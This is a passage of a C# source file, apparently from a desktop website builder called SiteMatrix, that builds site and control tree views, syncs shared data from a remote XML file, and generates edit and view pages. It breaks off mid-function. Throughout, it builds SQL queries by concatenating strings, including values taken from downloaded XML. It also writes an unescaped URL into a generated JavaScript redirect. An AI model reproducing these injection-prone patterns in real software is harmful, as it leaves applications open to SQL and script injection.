using System;
using SiteMatrix.consts;
using SiteMatrix.functions;
using System.Data.OleDb;
using SiteMatrix.database;
using SiteMatrix.forms;
using System.Windows.Forms;
using mshtml;
using SiteMatrix.Page;
using System.Text;
using System.IO;
using SiteMatrix.Compression;
using System.Net;
using System.Xml;
using SiteMatrix.ftplib;
using System.Collections;
using System.Text.RegularExpressions;
using System.Collections.Generic;

namespace SiteMatrix.SiteClass
{
    /// <summary>
    /// Site 的摘要说明。
    /// </summary>
    [System.ComponentModel.LicenseProviderAttribute(typeof(SiteMatrix.classes.LicenceProvider))]
    public class Site
    {
        public Site()
        {
            System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
        }
        public static bool setHomePage(string curpath,string homepage)
        {
            System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
            try
            {
                if(dir.Exists(curpath))
                {
                    if (homepage == null) homepage = "";
                    homepage = homepage.Trim();
                    string indexfile = curpath + "\\index.html";
                    string htmltext = "<HTML><HEAD><TITLE></TITLE></HEAD><BODY><SCRIPT LANGUAGE=\"JavaScript\">location.href=\"" + homepage + "\";</SCRIPT></BODY></HTML><dot4alice>";
                    if(!file.Exists(indexfile))
                    {
                        if(!homepage.Equals(""))
                        {
                            file.CreateText(indexfile, htmltext);
                        }
                    }
                    else
                    {
                        StreamReader sr=file.OpenText(indexfile);
                        bool IsDot4SiteFile = (sr.ReadToEnd().Trim().EndsWith("<dot4alice>"));
                        sr.Close();
                        if(IsDot4SiteFile)
                        {
                            file.Delete(indexfile);
                            if (!homepage.Equals(""))
                            {
                                file.CreateText(indexfile, htmltext);
                            }
                        }
                        else
                        {
                            if (!homepage.Equals(""))
                            {
                                MsgBox.Warning("File " + indexfile + " has exists!");
                                return false;
                            }
                        }
                    }
                }
                return true;
            }
            catch(Exception ex)
            {
                new error(ex);
                return false;
            }
        }
        public static void buildSiteExplorerTree(TreeView tv,bool NoParts)
        {
            tv.Enabled = true;
            tv.Nodes.Clear();
            TreeNode rootnode;
            rootnode = new TreeNode(globalConst.CurSite.Domain, 16, 16);
            string[] tag = new string[3];
            tag[0] = globalConst.CurSite.Domain;
            tag[1] = globalConst.CurSite.Domain;
            tag[2] = "root";
            rootnode.Tag = tag;
            tv.Nodes.Add(rootnode);
            if (NoParts)
                constructTreeNoPart(tv, rootnode, "root", " order by name", "caption");
            else
                constructTree(tv, rootnode, "root", " order by name", "caption");
            tv.CollapseAll();
            rootnode.Expand();
        }
        public static void buildControlExplorerTree(TreeView tv,string ControlName)
        {
            tv.Enabled = true;
            tv.Nodes.Clear();
            TreeNode rootnode;
            rootnode = new TreeNode(globalConst.CurSite.Domain, 16, 16);
            string[] tag = new string[3];
            tag[0] = globalConst.CurSite.Domain;
            tag[1] = globalConst.CurSite.Domain;
            tag[2] = "root";
            rootnode.Tag = tag;
            tv.Nodes.Add(rootnode);
            rootnode.Expand();
            string sql = null;
            sql = "select caption from controls where name='" + ControlName + "'";
            DR dr = new DR(globalConst.ConfigConn.OpenRecord(sql));
            if (dr.Read())
            {
                TreeNode controlnd = new TreeNode(dr.getString(0), 21, 21);
                tag = new string[3];
                tag[0] = ControlName;
                tag[1] = dr.getString(0);
                tag[2] = ControlName + "_" + "comp";
                controlnd.Tag = tag;
                rootnode.Nodes.Add(controlnd);
                rootnode.Expand();
                sql = "select caption,datasource from controls where name='" + ControlName + "'";
                DR dr2 = new DR(globalConst.CurSite.SiteConn.OpenRecord(sql));
                while (dr2.Read())
                {
                    TreeNode instancend = new TreeNode(dr2.getString(0), 18, 18);
                    tag = new string[3];
                    tag[0] = dr2.getString(1);
                    tag[1] = dr2.getString(0);
                    tag[2] = dr2.getString(1) + "_" + "instance";
                    instancend.Tag = tag;
                    controlnd.Nodes.Add(instancend);

                }
                dr2.Close();
                controlnd.Expand();
            }
            dr.Close();
        }
        public static void buildTableTagTree(TreeView tv)
        {
            tv.Enabled = true;
            tv.Nodes.Clear();
            TreeNode rootnode;
            rootnode = new TreeNode(globalConst.CurSite.Domain, 16, 16);
            string[] tag = new string[3];
            tag[0] = globalConst.CurSite.Domain;
            tag[1] = globalConst.CurSite.Domain;
            tag[2] = "root";
            rootnode.Tag = tag;
            tv.Nodes.Add(rootnode);
            rootnode.Expand();
            if (globalConst.CurSite.FormDataXML != null)
            {
                XmlNodeList nodes = globalConst.CurSite.FormDataXML.SelectNodes("/formdata/table");
                foreach (XmlNode node in nodes)
                {
                    TreeNode controlnd = new TreeNode(node.Attributes["id"].Value+"_"+node.Attributes["caption"].Value, 25, 25);
                    tag = new string[3];
                    tag[0] = node.Attributes["id"].Value;
                    tag[1] = node.Attributes["caption"].Value;
                    tag[2] = node.Attributes["id"].Value + "_" + "table";
                    controlnd.Tag = tag;
                    rootnode.Nodes.Add(controlnd);
                }
            }
            rootnode.Expand();
        }
        public static void UpdateShareXml()
        {
            System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
            try
            {
                if (globalConst.CurSite.ID == null) return;
                WebClient wc = new WebClient();
                string sql = "select url from sites where id='" + globalConst.CurSite.ID + "'";
                string _url = globalConst.ConfigConn.GetString(sql);
                _url += "/_ftpub/share.aspx";
                try
                {
                    wc.DownloadFile(_url, globalConst.ConfigPath + "\\share.xml");
                }
                catch
                {
                    return;
                }
                Application.DoEvents();

                if (!File.Exists(globalConst.ConfigPath + "\\share.xml")) return;
                XmlDocument xmldom = new XmlDocument();
                try
                {
                xmldom.Load(globalConst.ConfigPath + "\\share.xml");
            }
            catch
            {
                return;
            }
                Application.DoEvents();
                if (xmldom.InnerXml == null)
                {
                    return;
                }
                if (xmldom.InnerXml.Trim().Equals(""))
                {
                    return;
                }
                sql = "delete from share_data";
                globalConst.CurSite.SiteConn.execSql(sql);
                XmlNodeList xnl = xmldom.SelectSingleNode("//sites").ChildNodes;
                foreach (XmlNode node in xnl)
                {
                    if (!node.Name.Equals(globalConst.CurSite.ID))
                    {
                        string ssite = node.Name;
                        XmlNodeList xnl2 = node.ChildNodes;
                        foreach (XmlNode node2 in xnl2)
                        {
                            sql = "insert into share_data(id,name,caption,datasource,shared,site)values('" + node2.Attributes["id"].Value + "','" + node2.Attributes["name"].Value + "','" + node2.Attributes["caption"].Value + "','" + node2.Attributes["datasource"].Value + "','" + node2.Attributes["shared"].Value + "','" + ssite + "')";
                            globalConst.CurSite.SiteConn.execSql(sql);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                new error(ex);
            }
        }
        public static void InitSiteTree()
        {
            globalConst.MdiForm.SiteTree.Enabled = true;
            globalConst.MdiForm.SiteTree.Nodes.Clear();
            TreeNode rootnode;
            rootnode = new TreeNode(globalConst.CurSite.Domain, 16, 16);
            string[] tag = new string[3];
            tag[0] = globalConst.CurSite.Domain;
            tag[1] = globalConst.CurSite.Domain;
            tag[2] = "root";
            rootnode.Tag = tag;
            globalConst.MdiForm.SiteTree.Nodes.Add(rootnode);
            constructTree(globalConst.MdiForm.SiteTree, rootnode, "root", globalConst.siteTreeOrderby, globalConst.siteTreeShowColName);
            globalConst.MdiForm.SiteTree.CollapseAll();
            rootnode.Expand();
        }
        public static void open(string siteid)
        {
            try
            {
                //add site consts
                System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
                string sql = "select * from sites where id='" + siteid + "'";
                DR rdr = new DR(globalConst.ConfigConn.OpenRecord(sql));
                if(!rdr.Read())
                {
                    MsgBox.Error(res._site.GetString("m1"));
                    return;
                }
                globalConst.CurSite.ID = rdr.getString("id");
                globalConst.CurSite.Domain = rdr.getString("domin");
                globalConst.CurSite.Caption = rdr.getString("caption");
                globalConst.CurSite.URL = rdr.getString("url");
                rdr.Close();
                //site data connection
                globalConst.CurSite.SiteConn = new DB();
                globalConst.CurSite.SiteConn.Open("Provider=" + globalConst. OLEDBProvider + ";Data Source=" + globalConst.AppPath + @"\cfg\site_" + siteid + ".db");
                globalConst.CurSite.SiteConn2 = new DB();
                globalConst.CurSite.SiteConn2.Open("Provider=" + globalConst. OLEDBProvider + ";Data Source=" + globalConst.AppPath + @"\cfg\site_" + siteid + ".db");
                //path
                globalConst.CurSite.Path = globalConst.AppPath + @"\sites\" + siteid;
                //formdataxml
                string filename = globalConst.ConfigPath + "\\" + globalConst.CurSite.ID + "_formtable.xml";
                if (!file.Exists(filename)) globalConst.CurSite.FormDataXML = null;
                else
                {
                    globalConst.CurSite.FormDataXML = new XmlDocument();
                    globalConst.CurSite.FormDataXML.Load(filename);
                }
                //siteTree
                globalConst.MdiForm.SiteTree.Enabled = true;
                globalConst.MdiForm.SiteTree.Nodes.Clear();
                TreeNode rootnode;
                rootnode = new TreeNode(globalConst.CurSite.Domain, 16, 16);
                string[] tag = new string[3];
                tag[0] = globalConst.CurSite.Domain;
                tag[1] = globalConst.CurSite.Domain;
                tag[2] = "root";
                rootnode.Tag = tag;
                globalConst.MdiForm.SiteTree.Nodes.Add(rootnode);
                globalConst.siteTreeOrderby = " order by name";//can add desc
                globalConst.siteTreeShowColName = "caption";//caption or name
                constructTree(globalConst.MdiForm.SiteTree, rootnode, "root", globalConst.siteTreeOrderby, globalConst.siteTreeShowColName);
                globalConst.MdiForm.SiteTree.CollapseAll();
                rootnode.Expand();
                //				tmp=new TreeNode("111");
                //				j=globalConst.MdiForm.SiteTree.Nodes[i].Nodes.Add(tmp);
                //				tmp=new TreeNode("222");
                //				j=globalConst.MdiForm.SiteTree.Nodes[i].Nodes.Add(tmp);
                //				tmp=new TreeNode("333");
                //				j=globalConst.MdiForm.SiteTree.Nodes[i].Nodes.Add(tmp);
                //				globalConst.MdiForm.SiteTree.SelectedNode=tmp;
                //				globalConst.MdiForm.SiteTree.SelectedNode.Nodes.Add("444");
                //				globalConst.MdiForm.SiteTree.ExpandAll();	
                globalConst.MdiForm.ControlTree.Enabled = true;
                globalConst.ctrlTreeShowColName = "caption";
                globalConst.ctrlTreeOrderby = "";
                globalConst.ctrlTreeOrdertype = "";
                constructControlTree(globalConst.MdiForm.ControlTree, globalConst.ctrlTreeOrderby, globalConst.ctrlTreeOrdertype, globalConst.ctrlTreeShowColName);
                globalConst.MdiForm.WorkSpaceSiteTool.Enabled = true;
                globalConst.MdiForm.WorkSpaceControlTool.Enabled = true;
                if (globalConst.CurSite.ID != null)
                {
                    if (globalConst.ConfigConn.GetString("select thevalue from system where name='autogetshare'").Equals("1"))
                    {
                        LoadStat ls = new LoadStat();
                        ls.ShowDialog();
                    }
                }
                globalConst.MdiForm.UpdateMenusAndToolBars4Site();
            }
            catch (Exception ex)
            {
                new error(ex);
            }
        }
        public static void constructControlTree(TreeView tree, string orderby, string ordertype, string showcolname)
        {
            System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
            DB db3 = new DB();
            db3.Open("Provider=" + globalConst. OLEDBProvider + ";Data Source=" + globalConst.AppPath + @"\cfg\site_" + globalConst.CurSite.ID + ".db");
            DB db4 = new DB();
            db4.Open("Provider=" + globalConst. OLEDBProvider + ";Data Source=" + globalConst.ConfigPath + @"\config.db");
            DB db5 = new DB();
            db5.Open("Provider=" + globalConst. OLEDBProvider + ";Data Source=" + globalConst.AppPath + @"\cfg\site_" + globalConst.CurSite.ID + ".db");
            try
            {

                string orderbystring = " order by caption ";
                string orderstring = "";
                if (orderby.Equals("name")) orderbystring = " order by name ";
                if (orderby.Equals("caption")) orderbystring = " order by caption ";
                orderstring = orderbystring + ordertype;
                string sql = "select name,caption,company from controls" + orderstring;
                DR dr = new DR(globalConst.ConfigConn.OpenRecord(sql));
                while (dr.Read())
                {
                    int contrleimgindex = 28;
                    string controlcorp = dr.getString("company").ToLower(); ;
                    if (controlcorp.Equals("d4soft") || controlcorp.Equals("dotforsite") || controlcorp.Equals("syslive")) contrleimgindex = 21;
                    TreeNode nd = new TreeNode(dr.getString(showcolname), contrleimgindex, contrleimgindex);
                    string[] tag = new string[3];
                    tag[0] = dr.getString("name");
                    tag[1] = dr.getString("caption");
                    string thiscompname = dr.getString("name");
                    tag[2] = thiscompname + "_" + "comp";
                    nd.Tag = tag;
                    tree.Nodes.Add(nd);
                    //
                    orderbystring = "";
                    if (!orderby.Equals("")) orderbystring = " order by caption ";
                    if (orderby.Equals("addtime")) orderbystring = " order by addtime ";
                    orderstring = orderbystring + ordertype;
                    string csql = "select * from controls where name='" + tag[0] + "'" + orderstring;
                    DR dr2 = new DR(globalConst.CurSite.SiteConn.OpenRecord(csql));
                    while (dr2.Read())
                    {
                        TreeNode nd2 = new TreeNode(dr2.getString("caption"), 18, 18);
                        tag = new string[3];
                        tag[0] = dr2.getString("caption");
                        tag[1] = dr2.getString("caption");
                        tag[2] = dr2.getString("id");
                        nd2.Tag = tag;
                        nd.Nodes.Add(nd2);
                        //
                        string psql = "select id,name from parts where controlid='" + tag[2] + "'";
                        DR dr3 = new DR(db3.OpenRecord(psql));
                        while (dr3.Read())
                        {
                            string partname = dr3.getString("name");
                            string cpsql = "select caption from parts where name='" + partname + "' and controlname='" + thiscompname + "'";
                            string partcaption = "{noThisPart}";
                            DR dr4 = new DR(db4.OpenRecord(cpsql));
                            if (dr4.Read())
                            {
                                partcaption = dr4.getString(0);
                            }
                            dr4.Close();
                            TreeNode nd3 = null;
                            if (showcolname.Equals("name")) nd3 = new TreeNode(partname, 20, 20);
                            else
                            {
                                nd3 = new TreeNode(partcaption, 20, 20);
                            }

                            tag = new string[3];
                            tag[0] = partname;
                            tag[1] = partcaption;
                            tag[2] = dr3.getString("id");
                            nd3.Tag = tag;
                            nd2.Nodes.Add(nd3);
                            //
                            orderstring = "";
                            if (orderby.Equals("name")) orderbystring = " order by b.name ";
                            if (orderby.Equals("caption")) orderbystring = " order by b.caption ";
                            if (orderby.Equals("addtime")) orderbystring = " order by b.caption ";
                            orderstring = orderbystring + ordertype;
                            string pcpsql = "select a.pageid as pageid,b.name as name,b.caption as caption,b.ptype as ptype from part_in_page a,pages b where a.partid='" + tag[2] + "' and a.pageid=b.id" + orderstring;
                            DR dr5 = new DR(db5.OpenRecord(pcpsql));
                            while (dr5.Read())
                            {
                                TreeNode nd4 = new TreeNode(dr5.getString(showcolname));

                                tag = new string[4];
                                tag[0] = dr5.getString("name");
                                tag[1] = dr5.getString("caption");
                                tag[2] = dr5.getString("pageid");
                                tag[3] = dr5.getInt16("ptype").ToString();
                                switch (int.Parse(tag[3]))
                                {
                                    case 0:
                                        nd4.ImageIndex = 19;
                                        break;
                                    case 1:
                                        nd4.ImageIndex = 26;
                                        break;
                                    case 2:
                                        nd4.ImageIndex = 27;
                                        break;
                                }
                                nd4.SelectedImageIndex = nd4.ImageIndex;
                                nd4.Tag = tag;
                                nd3.Nodes.Add(nd4);

                            }
                            dr5.Close();
                        }
                        dr3.Close();
                    }
                    dr2.Close();
                }
                dr.Close();

            }
            catch (Exception ex)
            {
                new error(ex);
            }
            finally
            {
                db3.Close();
                db4.Close();
                db5.Close();
            }
        }
        public static void constructTreeNoPart(TreeView tree, TreeNode pnd, string pid, string orderby, string showcolname)
        {
            System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
            try
            {
                //channel
                TreeNode nd;
                DB db = new DB();
                db.Open("Provider=" + globalConst. OLEDBProvider + ";Data Source=" + globalConst.AppPath + @"\cfg\site_" + globalConst.CurSite.ID + ".db");
                string sql = "select * from directory where pid='" + pid + "'" + orderby;
                DR dr = new DR(db.OpenRecord(sql));
                while (dr.Read())
                {
                    nd = new TreeNode(dr.getString(showcolname), 17, 17);
                    string[] tag = new string[3];
                    tag[0] = dr.getString("name");
                    tag[1] = dr.getString("caption");
                    tag[2] = dr.getString("id");
                    nd.Tag = tag;
                    pnd.Nodes.Add(nd);
                    constructTreeNoPart(tree, nd, dr.getString("id"), orderby, showcolname);
                }
                dr.Close();
                //page
                sql = "select * from pages where pid='" + pid + "'" + orderby;
                DB db2 = new DB();
                db2.Open("Provider=" + globalConst. OLEDBProvider + ";Data Source=" + globalConst.AppPath + @"\cfg\site_" + globalConst.CurSite.ID + ".db");
                dr = new DR(db.OpenRecord(sql));
                while (dr.Read())
                {
                    nd = new TreeNode(dr.getString(showcolname));
                    string[] tag = new string[4];
                    tag[0] = dr.getString("name");
                    tag[1] = dr.getString("caption");
                    tag[2] = dr.getString("id");
                    tag[3] = dr.getInt16("ptype").ToString();
                    switch (int.Parse(tag[3]))
                    {
                        case 0:
                            nd.ImageIndex = 19;
                            break;
                        case 1:
                            nd.ImageIndex = 26;
                            break;
                        case 2:
                            nd.ImageIndex = 27;
                            break;
                    }
                    nd.SelectedImageIndex=nd.ImageIndex;
                    nd.Tag = tag;
                    pnd.Nodes.Add(nd);
                }
                dr.Close();
                db2.Close();
                db.Close();
            }
            catch (Exception ex)
            {
                new error(ex);
            }
        }
        public static void constructTree(TreeView tree, TreeNode pnd, string pid, string orderby, string showcolname)
        {
            System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
            try
            {
                //channel
                TreeNode nd;
                DB db = new DB();
                db.Open("Provider=" + globalConst. OLEDBProvider + ";Data Source=" + globalConst.AppPath + @"\cfg\site_" + globalConst.CurSite.ID + ".db");
                string sql = "select * from directory where pid='" + pid + "'" + orderby;
                DR dr = new DR(db.OpenRecord(sql));
                while (dr.Read())
                {
                    nd = new TreeNode(dr.getString(showcolname), 17, 17);
                    string[] tag = new string[3];
                    tag[0] = dr.getString("name");
                    tag[1] = dr.getString("caption");
                    tag[2] = dr.getString("id");
                    nd.Tag = tag;
                    pnd.Nodes.Add(nd);
                    constructTree(tree, nd, dr.getString("id"), orderby, showcolname);
                }
                dr.Close();
                //page
                sql = "select * from pages where pid='" + pid + "'" + orderby;
                DB db2 = new DB();
                db2.Open("Provider=" + globalConst. OLEDBProvider + ";Data Source=" + globalConst.AppPath + @"\cfg\site_" + globalConst.CurSite.ID + ".db");
                dr = new DR(db.OpenRecord(sql));
                while (dr.Read())
                {
                    nd = new TreeNode(dr.getString(showcolname));
                    string[] tag = new string[4];
                    tag[0] = dr.getString("name");
                    tag[1] = dr.getString("caption");
                    tag[2] = dr.getString("id");
                    tag[3] = dr.getInt16("ptype").ToString();
                    switch (int.Parse(tag[3]))
                    {
                        case 0:
                            nd.ImageIndex = 19;
                            break;
                        case 1:
                            nd.ImageIndex = 26;
                            break;
                        case 2:
                            nd.ImageIndex = 27;
                            break;
                    }
                    nd.SelectedImageIndex = nd.ImageIndex;
                    nd.Tag = tag;
                    pnd.Nodes.Add(nd);
                    //part
                    string psql = "select a.partid as partid,b.name as name,c.caption as caption,c.name as controlname from part_in_page a,parts b,controls c where a.pageid='" + tag[2] + "' and a.partid=b.id and c.id=b.controlid";
                    DR pdr = new DR(db2.OpenRecord(psql));
                    while (pdr.Read())
                    {
                        TreeNode ndp;
                        string thisctrlcaption = pdr.getString("caption");
                        string controlname = pdr.getString("controlname");
                        string partname = pdr.getString("name");
                        string controlcaption = "{NoCtrl}";
                        string partcaption = "{NoPart}";
                        string csql = "select a.caption as controlcaption,b.caption as partcaption from controls a,parts b where a.name='" + controlname + "' and a.name=b.controlname and b.name='" + partname + "'";
                        DR cpdr = new DR(globalConst.ConfigConn.OpenRecord(csql));
                        if (cpdr.Read())
                        {
                            controlcaption = cpdr.getString("controlcaption");
                            partcaption = cpdr.getString("partcaption");
                        }
                        cpdr.Close();
                        if (showcolname.Equals("name"))
                        {
                            ndp = new TreeNode(thisctrlcaption + "_" + controlname + "_" + partname, 20, 20);
                        }
                        else
                        {
                            ndp = new TreeNode(thisctrlcaption + "_" + controlcaption + "_" + partcaption, 20, 20);
                        }
                        string[] tagp = new string[3];
                        tagp[0] = thisctrlcaption + "_" + controlname + "_" + partname;
                        tagp[1] = thisctrlcaption + "_" + controlcaption + "_" + partcaption;
                        tagp[2] = pdr.getString("partid");
                        ndp.Tag = tagp;
                        nd.Nodes.Add(ndp);
                    }
                    pdr.Close();
                }

                dr.Close();
                db2.Close();
                db.Close();
            }
            catch (Exception ex)
            {
                new error(ex);
            }
        }
        public static void constructTree4Import(TreeView tree, TreeNode pnd, string pid,string dbname)
        {
            System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
            try
            {
                //channel
                TreeNode nd;
                DB db = new DB();
                db.Open("Provider=" + globalConst. OLEDBProvider + ";Data Source=" + dbname);
                string sql = "select * from directory where pid='" + pid + "'";
                DR dr = new DR(db.OpenRecord(sql));
                while (dr.Read())
                {
                    nd = new TreeNode(dr.getString("caption"), 17, 17);
                    string[] tag = new string[3];
                    tag[0] = dr.getString("name");
                    tag[1] = dr.getString("caption");
                    tag[2] = dr.getString("id");
                    nd.Tag = tag;
                    pnd.Nodes.Add(nd);
                    constructTree4Import(tree, nd, dr.getString("id"), dbname);
                }
                dr.Close();
                //page
                sql = "select * from pages where pid='" + pid + "'";
                dr = new DR(db.OpenRecord(sql));
                while (dr.Read())
                {
                    nd = new TreeNode(dr.getString("caption"));
                    string[] tag = new string[4];
                    tag[0] = dr.getString("name");
                    tag[1] = dr.getString("caption");
                    tag[2] = dr.getString("id");
                    tag[3] = dr.getInt16("ptype").ToString();
                    switch (int.Parse(tag[3]))
                    {
                        case 0:
                            nd.ImageIndex = 19;
                            break;
                        case 1:
                            nd.ImageIndex = 26;
                            break;
                        case 2:
                            nd.ImageIndex = 27;
                            break;
                    }
                    nd.SelectedImageIndex = nd.ImageIndex;
                    nd.Tag = tag;
                    pnd.Nodes.Add(nd);
                    
                }

                dr.Close();
                db.Close();
            }
            catch (Exception ex)
            {
                new error(ex);
            }
        }
        public static void constructTree4PageSel(TreeView tree, TreeNode pnd, string pid)
        {
            System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
            try
            {
                //channel
                TreeNode nd;
                DB db = new DB();
                db.Open("Provider=" + globalConst.OLEDBProvider + ";Data Source=" + globalConst.AppPath + @"\cfg\site_" + globalConst.CurSite.ID + ".db");
                string sql = "select * from directory where pid='" + pid + "'";
                DR dr = new DR(globalConst.CurSite.SiteConn2.OpenRecord(sql));
                while (dr.Read())
                {
                    nd = new TreeNode(dr.getString("caption"), 17, 17);
                    string[] tag = new string[3];
                    tag[0] = dr.getString("name");
                    tag[1] = dr.getString("caption");
                    tag[2] = dr.getString("id");
                    nd.Tag = tag;
                    pnd.Nodes.Add(nd);
                    constructTree4PageSel(tree, nd, dr.getString("id"));
                }
                dr.Close();
                //page
                sql = "select * from pages where pid='" + pid + "'";
                dr = new DR(db.OpenRecord(sql));
                while (dr.Read())
                {
                    nd = new TreeNode(dr.getString("caption"));
                    string[] tag = new string[4];
                    tag[0] = dr.getString("name");
                    tag[1] = dr.getString("caption");
                    tag[2] = dr.getString("id");
                    tag[3] = dr.getInt16("ptype").ToString();
                    switch (int.Parse(tag[3]))
                    {
                        case 0:
                            nd.ImageIndex = 19;
                            break;
                        case 1:
                            nd.ImageIndex = 26;
                            break;
                        case 2:
                            nd.ImageIndex = 27;
                            break;
                    }
                    nd.SelectedImageIndex = nd.ImageIndex;
                    nd.Tag = tag;
                    pnd.Nodes.Add(nd);

                }

                dr.Close();
                db.Close();
            }
            catch (Exception ex)
            {
                new error(ex);
            }
        }
        public static void loopTree4TextChange(TreeNodeCollection nds, int tagI)
        {
            try
            {
                int i;
                for (i = 0; i < nds.Count; i++)
                {
                    nds[i].Text = ((string[])nds[i].Tag)[tagI];
                    loopTree4TextChange(nds[i].Nodes, tagI);
                }
            }
            catch (Exception ex)
            {
                new error(ex);
            }
        }

        public static void loopTree4DeleteData(TreeNodeCollection nds, int tagI)
        {
            try
            {
                int i;
                string id;
                string sql;
                for (i = 0; i < nds.Count; i++)
                {
                    id = ((string[])nds[i].Tag)[tagI];
                    if (tree.getTypeFromID(id).Equals("drct"))
                    {
                        sql = "delete from directory where id='" + id + "'";
                        globalConst.CurSite.SiteConn.execSql(sql);
                        loopTree4DeleteData(nds[i].Nodes, tagI);
                    }
                    if (tree.getTypeFromID(id).Equals("page"))
                    {
                        sql = "delete from pages where id='" + id + "'";
                        globalConst.CurSite.SiteConn.execSql(sql);

                        sql = "delete from part_in_page where pageid='" + id + "'";
                        globalConst.CurSite.SiteConn.execSql(sql);
                        //close edit form
                        form.closeEditor(id);
                    }
                }
            }
            catch (Exception ex)
            {
                new error(ex);
            }
        }
        public static bool constructEditPageFromText(string pageid, string filepath)
        {
            globalConst.MdiForm.MainStatus.Text = "Constructing Edit Page From Text";
            System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
            try
            {
                int left = 0; int right = 0;
                string filetext = file.getFileText(filepath, System.Text.Encoding.UTF8);
                if(filetext.IndexOf("<!--DSComment<!DOCTYPE")<0)
                {
                    left=filetext.IndexOf("<!DOCTYPE");
                    if(left>=0)
                    {
                        right=filetext.IndexOf(">",left);
                        if(left>=0 && right>=0)
                        {
                            string doctypestr=filetext.Substring(left,right-left+1);
                            filetext = filetext.Replace(doctypestr, "<!--DSComment" + doctypestr + "DSComment-->");
                        }
                    }
                }
                string sql = "delete from part_in_page where pageid='" + pageid + "'";
                globalConst.CurSite.SiteConn.execSql(sql);
                Regex r = new Regex(@"(<dotforsite:control[^>]*></dotforsite:control>)|(<ftdp:control[^>]*></ftdp:control>)");
                MatchCollection mc = r.Matches(filetext); 
                foreach (Match m in mc)
                {
                    string ControlNode = m.Value;
                    left = ControlNode.IndexOf(" id=");
                    right = ControlNode.IndexOf(" ",left+1);
                    string iid = ControlNode.Substring(left + 4, right - left - 4).Replace("\"","");
                    left = ControlNode.IndexOf(" name=");
                    right = ControlNode.IndexOf(" ", left + 1);
                    string iname = ControlNode.Substring(left + 6, right - left - 6).Replace("\"", "");
                    string iheight = null;
                    left = ControlNode.IndexOf(" height=");
                    if (left > 0)
                    {
                        right = ControlNode.IndexOf(" ", left + 1);
                        if (right < 0) right = ControlNode.IndexOf(">", left + 1);
                        iheight = ControlNode.Substring(left + 8, right - left - 8).Replace("\"", "");
                    }
                    string iwidth = null;
                    left = ControlNode.IndexOf(" width=");
                    if (left > 0)
                    {
                        right = ControlNode.IndexOf(" ", left + 1);
                        if (right < 0) right = ControlNode.IndexOf(">", left + 1);
                        iwidth = ControlNode.Substring(left + 7, right - left - 7).Replace("\"", "");
                    }
                    if (iheight == null && iwidth == null) iwidth = "100%";
                    sql = "insert into part_in_page(pageid,partid)values('" + pageid + "','" + iid + "')";
                    globalConst.CurSite.SiteConn.execSql(sql);
                    sql = "select a.name as warename,b.partxml as partxml,b.asportal as asportal,b.controlid from controls a,parts b where a.id=b.controlid and b.id='" + iid + "'";// and b.name='" + iname + "'";
                    OleDbDataReader rdr = globalConst.CurSite.SiteConn.OpenRecord(sql);
                    if (rdr.Read())
                    {
                        filetext = filetext.Replace(m.Value, globalConst.PageWare.getControlEditHead(iid, iname, iwidth, iheight, rdr.GetString(0)) + PageWare.getPartHtml(rdr.GetString(3), rdr.GetString(0), iname, rdr.GetString(1), rdr.GetInt32(2)) + globalConst.PageWare.getControlEditTail());
                    }
                    rdr.Close();
                }
                file.Delete(filepath + "_edit.htm");
                file.CreateText(filepath + "_edit.htm", filetext);
            }
            catch (Exception ex)
            {
                new error(ex);
                return false;
            }
            globalConst.MdiForm.MainStatus.Text = "Construct Finished";
            return true;
        }
        public static bool constructViewPageFromText(string pageid, string filepath)
        {
            globalConst.MdiForm.MainStatus.Text = "Constructing View Page From Text";
            System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
            try
            {
                int left = 0; int right = 0;
                string filetext = file.getFileText(filepath, System.Text.Encoding.UTF8);
                Regex r = new Regex(@"(<dotforsite:control[^>]*></dotforsite:control>)|(<ftdp:control[^>]*></ftdp:control>)");
                MatchCollection mc = r.Matches(filetext);
                foreach (Match m in mc)
                {
                    string ControlNode = m.Value;
                    left = ControlNode.IndexOf(" id=");
                    right = ControlNode.IndexOf(" ", left + 1);
                    string iid = ControlNode.Substring(left + 4, right - left - 4).Replace("\"", "");
                    left = ControlNode.IndexOf(" name=");
                    right = ControlNode.IndexOf(" ", left + 1);
                    string iname = ControlNode.Substring(left + 6, right - left - 6).Replace("\"", "");
                    string iheight = null;
                    left = ControlNode.IndexOf(" height=");
                    if (left > 0)
                    {
                        right = ControlNode.IndexOf(" ", left + 1);
                        if (right < 0) right = ControlNode.IndexOf(">", left + 1);
                        iheight = ControlNode.Substring(left + 8, right - left - 8).Replace("\"", "");
                    }
                    string iwidth = null;
                    left = ControlNode.IndexOf(" width=");
                    if (left > 0)
                    {
                        right = ControlNode.IndexOf(" ", left + 1);
                        if (right < 0) right = ControlNode.IndexOf(">", left + 1);
                        iwidth = ControlNode.Substring(left + 7, right - left - 7).Replace("\"", "");
                    }
                    if (iheight == null && iwidth == null) iwidth = "100%";
                    string sql = "select a.name as warename,b.partxml as partxml,b.asportal as asportal from controls a,parts b where a.id=b.controlid and b.id='" + iid + "'";// and b.name='" + iname + "'";
                    OleDbDataReader rdr = globalConst.CurSite.SiteConn.OpenRecord(sql);
                    if (rdr.Read())
                    {
                        filetext = filetext.Replace(m.Value, globalConst.PageWare.getControlViewHead(iwidth, iheight) + PageWare.getPartHtml(iid, rdr.GetString(0), iname, rdr.GetString(1), rdr.GetInt32(2)) + globalConst.PageWare.getControlViewTail());
                    }
                    rdr.Close();
                }
                file.Delete(filepath + "_view.htm");
                file.CreateText(filepath + "_view.htm", filetext);
            }
            catch (Exception ex)
            {
                new error(ex);
                return false;
            }
            globalConst.MdiForm.MainStatus.Text = "Construct Finished";
            return true;
        }
        public static bool constructEditPageFromText_Old(string pageid, string filepath)
        {
            globalConst.MdiForm.MainStatus.Text = "Constructing Edit Page From Text";
            System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
            try
            {
